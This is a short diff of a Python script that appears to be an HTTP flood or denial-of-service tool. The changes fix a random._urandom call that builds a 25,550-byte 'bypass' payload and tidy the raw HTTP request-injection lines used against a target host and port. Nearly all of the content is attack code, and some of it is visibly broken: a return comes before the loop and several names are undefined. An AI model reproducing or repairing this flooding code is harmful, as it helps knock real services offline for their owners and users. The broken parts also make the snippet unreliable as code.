@@ -56,7 +56,7 @@ for x in range(2000):
     spoof2 = random.randint(0, 15672)
     spoof3 = random.randint(0, 17721)
     spoof4 = random.randint(0, 28291)
-    bypass = random._urandom(100, 25550)
+    bypass = random._urandom(25550)
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     
 
@@ -81,7 +81,7 @@ def start():
     content    = "Content-Type: application/x-www-form-urlencoded\r\n"
     length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
     target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
-    bypass_inject =  sockpeler + reffer + userAdmin + content + target_host + length + "\r\n"
+    bypass_inject = sockpeler + reffer + userAdmin + content + target_host + length + "\r\n"
     return subjection
     while True:
           try:
